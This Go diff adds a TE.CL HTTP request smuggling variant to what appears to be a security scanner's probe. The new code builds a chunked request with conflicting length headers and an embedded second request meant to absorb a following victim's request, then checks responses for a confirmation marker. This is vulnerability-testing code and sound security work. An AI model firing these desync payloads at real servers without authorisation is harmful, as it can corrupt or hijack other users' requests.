@@ -4,6 +4,7 @@ import (
 	"context"
 	"fmt"
 	"net"
+	"strconv"
 	"strings"
 	"time"
 
@@ -20,12 +21,24 @@ import (
 // The probe never dials. Runner supplies a ConnSource bound to one pinned
 // session, so both connections share one proxy and one exit IP.
 type SmuggleChainProbe struct {
+	// Variant selects the framing disagreement. CL.TE is the original "GPOST"
+	// chain; TE.CL plants a complete second request inside a chunked body.
+	Variant SmuggleVariant
+
 	// VictimMethod defaults to POST: with the CL.TE prefix the back-end sees
 	// "G"+method, so POST becomes the GPOST marker.
 	VictimMethod string
 	VictimPath   string
 	// VictimHeaders are added to the victim request verbatim.
 	VictimHeaders []rawhttp.Header
+
+	// Fields of the request smuggled inside a TE.CL chunk. SmuggledMethod and
+	// SmuggledPath default to GET and "/omnislash-<nonce>"; SmuggledHost
+	// defaults to the target's Host. SmuggledBody is emitted verbatim.
+	SmuggledMethod string
+	SmuggledPath   string
+	SmuggledHost   string
+	SmuggledBody   string
 
 	// SuccessContains is the marker a desynced response must contain. The probe
 	// does not guess: without a marker it reports evidence and no verdict.
@@ -62,7 +75,17 @@ func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, sou
 		attempts = 3
 	}
 
-	payload, err := (&SmugglingProbe{Variant: VariantCLTE}).build(VariantCLTE, target, "/")
+	variant := p.Variant
+	if variant == "" {
+		variant = VariantCLTE
+	}
+	var payload []byte
+	var err error
+	if variant == VariantTECL {
+		payload, err = p.buildTECL(target)
+	} else {
+		payload, err = (&SmugglingProbe{Variant: variant}).build(variant, target, "/")
+	}
 	if err != nil {
 		return nil, err
 	}
@@ -98,8 +121,9 @@ func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, sou
 		if err := e.write(payload); err != nil {
 			return e.finish(), fmt.Errorf("probe: payload write (attempt %d): %w", attempt, err)
 		}
-		if _, err := e.read(); err != nil && !isTimeout(err) {
-			return e.finish(), fmt.Errorf("probe: payload read (attempt %d): %w", attempt, err)
+		probeResp, readErr := e.read()
+		if readErr != nil && !isTimeout(readErr) && probeResp == nil {
+			return e.finish(), fmt.Errorf("probe: payload read (attempt %d): %w", attempt, readErr)
 		}
 
 		// The desync is carried by the front-end's back-end connection, so the
@@ -118,12 +142,14 @@ func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, sou
 		after := e.readUntilIdle(idle)
 
 		if p.SuccessContains != "" {
-			for _, r := range after {
-				if p.markerIn(r) {
+			// TE.CL often returns the smuggled response to the poison request
+			// itself; CL.TE delivers it to the victim socket. Check both.
+			for _, r := range append([]*Response{probeResp}, after...) {
+				if r != nil && p.markerIn(r) {
 					e.addFinding(Finding{
 						Kind:       "smuggle_confirmed",
 						Confidence: ConfidenceHigh,
-						Detail:     fmt.Sprintf("victim response contained %q: its request line was prefixed by the smuggled byte", p.SuccessContains),
+						Detail:     fmt.Sprintf("response %d contained %q after a %s chain", r.Seq, p.SuccessContains, variant),
 						Response:   r.Seq,
 					})
 					return e.finish(), nil
@@ -138,6 +164,59 @@ func (p *SmuggleChainProbe) ExecuteMulti(ctx context.Context, target Target, sou
 		Detail:     fmt.Sprintf("marker %q did not appear after %d attempts", p.SuccessContains, attempts),
 	})
 	return e.finish(), nil
+}
+
+// buildTECL builds the mirror chain. The front-end honours Transfer-Encoding
+// and forwards the whole chunked body. A Content-Length back-end reads only the
+// chunk-size line ("87\r\n"), then parses the chunk data as its next request.
+// The smuggled request is deliberately short of body bytes so the following
+// victim request supplies the rest, as in the classic TE.CL exploit.
+func (p *SmuggleChainProbe) buildTECL(target Target) ([]byte, error) {
+	method := p.SmuggledMethod
+	if method == "" {
+		method = "GET"
+	}
+	path := p.SmuggledPath
+	if path == "" {
+		path = "/omnislash-" + newNonce()
+	}
+	host := p.SmuggledHost
+	if host == "" {
+		host = target.HostHeader()
+	}
+	body := p.SmuggledBody
+	if body == "" {
+		body = "x=1"
+	}
+	smuggled, err := render(requestSpec{
+		Method: method,
+		Path:   path,
+		Headers: []rawhttp.Header{
+			{Key: "Host", Value: host},
+			{Key: "Content-Type", Value: "application/x-www-form-urlencoded"},
+			{Key: "Content-Length", Value: strconv.Itoa(len(body) + 12)},
+		},
+		Body: []byte(body),
+	})
+	if err != nil {
+		return nil, fmt.Errorf("probe: render smuggled request: %w", err)
+	}
+	chunk := strconv.FormatInt(int64(len(smuggled)), 16) + "\r\n" + string(smuggled) + "\r\n0\r\n\r\n"
+	outer, err := render(requestSpec{
+		Method: "POST",
+		Path:   target.RequestPath(),
+		Headers: []rawhttp.Header{
+			{Key: "Host", Value: target.HostHeader()},
+			{Key: "User-Agent", Value: "omnislash-probe/1"},
+			{Key: "Content-Length", Value: "4"},
+			{Key: "Transfer-Encoding", Value: "chunked"},
+		},
+		Body: []byte(chunk),
+	})
+	if err != nil {
+		return nil, fmt.Errorf("probe: render TE.CL payload: %w", err)
+	}
+	return outer, nil
 }
 
 func (p *SmuggleChainProbe) renderVictim(target Target) ([]byte, error) {
